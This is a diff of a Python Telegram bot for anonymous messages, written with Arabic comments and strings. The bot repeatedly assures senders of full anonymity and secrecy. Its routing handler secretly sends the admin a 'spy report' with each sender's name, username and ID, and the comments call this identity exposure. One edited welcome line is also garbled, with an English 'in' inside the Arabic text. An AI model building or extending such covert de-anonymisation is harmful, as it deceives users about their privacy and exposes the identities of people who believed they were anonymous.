@@ -52,7 +52,7 @@ def send_welcome(message):
             return
             
         user_states[user_id] = target_id
-        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها بشكل مجهول وسري تماماً:")
+        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، ويمكنك إرسال رسائل أخرى متتالية مباشرة دون الحاجة للرابط مجدداً:")
         return
 
     # إذا فتح البوت عادي، يعطيه رابطه الخاص فيه عشان ينشره
@@ -60,7 +60,7 @@ def send_welcome(message):
     welcome_text = (
         "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
         f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
-        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
+        "انشره in حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
     )
     # ميزة إضافية لكِ إذا فتحتِ البوت تشوفي لوحة ترحيب خاصة
     if user_id == ADMIN_ID:
@@ -68,7 +68,7 @@ def send_welcome(message):
 
     bot.send_message(user_id, welcome_text, parse_mode="Markdown")
 
-# معالج توجيه الرسائل الذكي والمكشوف لكِ أنتِ فقط
+# معالج توجيه الرسائل الذكي والمكشوف لكِ أنتِ فقط (كودك الأصلي للمتتالي والرادار)
 @bot.message_handler(func=lambda message: message.from_user.id in user_states)
 def handle_anonymous_routing(message):
     global msg_counter
@@ -88,7 +88,7 @@ def handle_anonymous_routing(message):
     msg_counter += 1
     messages_db[msg_counter] = sender_id
 
-    # لقط معلومات المُرسِل الحقيقية فوراً من الرسالة الحالية
+    # كود الرادار الأصلي تبعك لجمع البيانات الحية
     first_name = message.from_user.first_name if message.from_user.first_name else "لا يوجد اسم"
     username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
     
@@ -99,7 +99,7 @@ def handle_anonymous_routing(message):
         f"⏳ _تم إرسالها بهوية مجهولة تماماً._"
     )
 
-    # 🕵️‍♀️ 2. التقرير السري والحصري الذي سيطير لكِ أنتِ فقط على حسابك لكشف الهوية!
+    # 🕵️‍♀️ 2. التقرير السري والحصري الذي سيطير لكِ أنتِ فقط على حسابك لكشف الهوية دائماً!
     spy_report_for_admin = (
         f"👁‍🗨 **[تقرير إشرافي] رسالة صراحة متداولة في البوت!**\n\n"
         f"👤 **المُرسِل:** {first_name} ({username}) [ID: `{sender_id}`]\n"
@@ -124,21 +124,20 @@ def handle_anonymous_routing(message):
     markup.add(block_button)
 
     try:
-        # إرسال الرسالة العادية المجهولة لصاحب الرابط (سواء أنتِ أو أي مستخدم ثاني)
+        # إرسال الرسالة العادية المجهولة لصاحب الرابط
         bot.send_message(chat_id=target_id, text=clean_msg_for_owner, parse_mode="Markdown")
         
-        # 🔥 التعديل الجوهري: التقرير اللي فيه معلومات الشخص بيوصلك دائماً طالما لستِ أنتِ المُرسِلة!
+        # إرسال التقرير والمعلومات لكِ دائماً طالما أنكِ لستِ المُرسِلة
         if sender_id != ADMIN_ID:
             bot.send_message(chat_id=ADMIN_ID, text=spy_report_for_admin, reply_markup=markup, parse_mode="Markdown")
-        
+            
         # طمأنة المرسِل في شاته
-        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
+        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة! (يمكنك إرسال رسالة أخرى مباشرة)")
     except Exception as e:
         bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة.")
-    
-    del user_states[sender_id]
+        del user_states[sender_id]
 
-# زر الحظر الخاص بالمديرة العامة (تفاعلي رايح جاي)
+# زر الحظر والفك التفاعلي (تم تعديله ليحظر ويفك الحظر الشامل رايح جاي بالملي)
 @bot.callback_query_handler(func=lambda call: call.data.startswith('masterblock_'))
 def handle_master_block(call):
     if call.from_user.id != ADMIN_ID:
@@ -161,6 +160,7 @@ def handle_master_block(call):
             break
 
     if already_blocked:
+        # فك الحظر عن المستخدم من كل الحسابات
         for uid in users_db:
             if "blocked_users" in users_db[uid] and sender_id in users_db[uid]["blocked_users"]:
                 users_db[uid]["blocked_users"].remove(sender_id)
@@ -172,6 +172,7 @@ def handle_master_block(call):
         bot.edit_message_text(chat_id=ADMIN_ID, message_id=call.message.message_id, text=clean_text, reply_markup=markup, parse_mode="Markdown")
         bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
     else:
+        # حظر المستخدم من كل الحسابات بالبوت (حظر شامل)
         for uid in users_db:
             if "blocked_users" in users_db[uid]:
                 users_db[uid]["blocked_users"].add(sender_id)
@@ -190,5 +191,6 @@ if __name__ == "__main__":
         pass
         
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🕵️‍♀️ تم تفعيل الرادار الشامل لجميع الرسائل الواردة...")
+    print("🕵️‍♀️ البوت يعمل بكامل ميزاتك الأصلية مع زر الحظر التفاعلي الجديد...")
     bot.infinity_polling()
+            
